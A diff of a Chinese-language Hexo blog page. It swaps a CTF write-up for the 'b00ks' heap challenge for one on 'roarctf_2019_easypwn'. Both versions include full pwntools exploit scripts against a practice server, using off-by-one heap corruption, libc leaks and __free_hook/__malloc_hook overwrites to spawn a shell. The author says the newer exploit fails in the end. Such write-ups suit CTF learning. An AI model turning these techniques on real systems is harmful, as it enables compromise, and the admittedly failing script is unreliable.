@@ -6,28 +6,34 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>b00ks | Hexo</title>
+  <title>roarctf_2019_easypwn | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="甩到脸上的off-by-one 是一个图书管理系统 这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作  打印的时候会连堆地址也打印出来123456add(0x80,&amp;#x27;cccccccc&amp;#x27;,0x60,&amp;#x27;dddddddd&amp;#x27;)add(0x10,&amp;#x27;eeeeeeee&amp;#x27;,0x10,&amp;#x27;ffffffff&amp;#x27;)free(2)edi">
+  <meta name="description" content="保护全开 edit函数  若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞  这里不太懂为什么伪造的堆1 free不会报错 1free(1)   1add(0x90)   试用这种方法也能show出main_arena   至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小 1add(0x80)  奇怪，这里再申请0x80的大小，然">
 <meta property="og:type" content="article">
-<meta property="og:title" content="b00ks">
-<meta property="og:url" content="http://example.com/2024/03/11/b00ks/index.html">
+<meta property="og:title" content="roarctf_2019_easypwn">
+<meta property="og:url" content="http://example.com/2024/03/18/roarctf-2019-easy-pwn/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="甩到脸上的off-by-one 是一个图书管理系统 这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作  打印的时候会连堆地址也打印出来123456add(0x80,&amp;#x27;cccccccc&amp;#x27;,0x60,&amp;#x27;dddddddd&amp;#x27;)add(0x10,&amp;#x27;eeeeeeee&amp;#x27;,0x10,&amp;#x27;ffffffff&amp;#x27;)free(2)edi">
+<meta property="og:description" content="保护全开 edit函数  若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞  这里不太懂为什么伪造的堆1 free不会报错 1free(1)   1add(0x90)   试用这种方法也能show出main_arena   至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小 1add(0x80)  奇怪，这里再申请0x80的大小，然">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i0.imgs.ovh/2024/03/10/RPetI.png">
-<meta property="og:image" content="https://i0.imgs.ovh/2024/03/10/RPckj.png">
-<meta property="og:image" content="https://i0.imgs.ovh/2024/03/10/RP1wJ.png">
-<meta property="og:image" content="https://i0.imgs.ovh/2024/03/10/RPiZe.png">
-<meta property="og:image" content="https://i0.imgs.ovh/2024/03/10/RPJOW.png">
-<meta property="og:image" content="https://i0.imgs.ovh/2024/03/10/RV2Qp.png">
-<meta property="article:published_time" content="2024-03-11T06:17:34.000Z">
-<meta property="article:modified_time" content="2024-03-11T08:25:17.302Z">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7kas.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7IOU.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7wKH.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7pZO.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7HD9.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7nO3.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7lwe.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/18/eKiYo.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e73jD.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7mLo.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e760A.png">
+<meta property="og:image" content="https://i0.imgs.ovh/2024/03/19/e7Wt5.png">
+<meta property="article:published_time" content="2024-03-18T15:03:09.000Z">
+<meta property="article:modified_time" content="2024-03-20T07:42:47.518Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i0.imgs.ovh/2024/03/10/RPetI.png">
+<meta name="twitter:image" content="https://i0.imgs.ovh/2024/03/19/e7kas.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -210,14 +216,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-b00ks" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-roarctf-2019-easy-pwn" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      b00ks
+      roarctf_2019_easypwn
     </h1>
   
 
@@ -229,8 +235,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2024/03/11/b00ks/" class="archive-article-date">
-        <time datetime="2024-03-11T06:17:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-11</time>
+<a href="/2024/03/18/roarctf-2019-easy-pwn/" class="archive-article-date">
+        <time datetime="2024-03-18T15:03:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-18</time>
 </a>
 
   
@@ -243,7 +249,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">436字</span>
+      <span class="post-count">456字</span>
     </span>
   </span>
 
@@ -263,17 +269,33 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p><img src="https://i0.imgs.ovh/2024/03/10/RPetI.png" alt="image-20240311142425453"></p>
-<h5 id="甩到脸上的off-by-one"><a href="#甩到脸上的off-by-one" class="headerlink" title="甩到脸上的off-by-one"></a>甩到脸上的off-by-one</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPckj.png" alt="image-20240311141823683"></p>
-<h5 id="是一个图书管理系统"><a href="#是一个图书管理系统" class="headerlink" title="是一个图书管理系统"></a>是一个图书管理系统</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RP1wJ.png" alt="image-20240311142646867"></p>
-<h5 id="这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作"><a href="#这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作" class="headerlink" title="这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作"></a>这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPiZe.png" alt="image-20240311142945990"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/10/RPJOW.png" alt="image-20240311142840161"></p>
-<h5 id="打印的时候会连堆地址也打印出来"><a href="#打印的时候会连堆地址也打印出来" class="headerlink" title="打印的时候会连堆地址也打印出来"></a>打印的时候会连堆地址也打印出来</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccccccc&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;dddddddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;eeeeeeee&#x27;</span>,<span class="number">0x10</span>,<span class="string">&#x27;ffffffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>)+p64(<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure>
+    <p> 保护全开</p>
+<p>edit函数</p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p>
+<p>若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞</p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p>
+<h4 id="这里不太懂为什么伪造的堆1-free不会报错"><a href="#这里不太懂为什么伪造的堆1-free不会报错" class="headerlink" title="这里不太懂为什么伪造的堆1 free不会报错"></a>这里不太懂为什么伪造的堆1 free不会报错</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p>
+<p>试用这种方法也能show出main_arena</p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p>
+<h4 id="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"><a href="#至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小" class="headerlink" title="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"></a>至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="奇怪，这里再申请0x80的大小，然后size还是0xa1"><a href="#奇怪，这里再申请0x80的大小，然后size还是0xa1" class="headerlink" title="奇怪，这里再申请0x80的大小，然后size还是0xa1"></a>奇怪，这里再申请0x80的大小，然后size还是0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p>
+<h5 id="这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21"><a href="#这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21" class="headerlink" title="这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)"></a>这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x21</span>)</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://i0.imgs.ovh/2024/03/10/RV2Qp.png" alt="image-20240311151905833"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25494</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./b00ks&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;k&#x27;</span>*<span class="number">0x1f</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1,content1,size2,content2</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size:&#x27;</span>,<span class="built_in">str</span>(size1))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>,content1)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book description size:&#x27;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book description:&#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idd,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>,<span class="built_in">str</span>(idd))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter new book description: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idd</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>,<span class="built_in">str</span>(idd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ren</span>(<span class="params">content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>,<span class="number">0x20</span>,<span class="string">&#x27;bbbbbbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;kb&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccccccc&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;dddddddd&#x27;</span>) <span class="comment">#2 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;bin/sh&#x27;</span>,<span class="number">0x10</span>,<span class="string">&#x27;ffffffff&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">ren(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span></span><br><span class="line">malloc_hook=main_addr-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_addr&#x27;</span>+<span class="built_in">hex</span>(main_addr))</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook)+p64(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" alt="image-20240319214501997"></p>
+<h5 id="不过最后的话，是打不通的。"><a href="#不过最后的话，是打不通的。" class="headerlink" title="不过最后的话，是打不通的。"></a>不过最后的话，是打不通的。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28118</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x22</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p8(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">main_arena=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).strip()[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span></span><br><span class="line">malloc_hook=main_arena-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook=base+libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x28</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">3</span>]</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x1b</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc_hook+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
     
@@ -311,7 +333,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://example.com/2024/03/11/b00ks/" title="b00ks" target="_blank">http://example.com/2024/03/11/b00ks/</a>
+          <a href="http://example.com/2024/03/18/roarctf-2019-easy-pwn/" title="roarctf_2019_easypwn" target="_blank">http://example.com/2024/03/18/roarctf-2019-easy-pwn/</a>
         </li>
         
         <li>
@@ -378,7 +400,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/03/11/b00ks/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/03/18/roarctf-2019-easy-pwn/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -393,18 +415,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2024/03/11/stkof/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          STKOF
-        
-      </div>
-    </a>
   
-  
-    <a href="/2024/03/10/freenote-x64/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">freenote_x64</div>
+    <a href="/2024/03/18/ciscn-2019-es-7/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ciscn_2019_es_7</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -431,7 +444,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A9%E5%88%B0%E8%84%B8%E4%B8%8A%E7%9A%84off-by-one"><span class="toc-number">1.</span> <span class="toc-text">甩到脸上的off-by-one</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">是一个图书管理系统</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E8%A6%86%E7%9B%96%E6%8E%89%E5%AD%98%E5%A0%86%E5%9C%B0%E5%9D%80%E7%9A%84%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%94%B9%E5%A0%86%E5%9C%B0%E5%9D%80%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E7%9A%84%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%9E%E5%A0%86%E5%9C%B0%E5%9D%80%E4%B9%9F%E6%89%93%E5%8D%B0%E5%87%BA%E6%9D%A5"><span class="toc-number">4.</span> <span class="toc-text">打印的时候会连堆地址也打印出来</span></a></li><li class="toc-item toc-level-5"><a 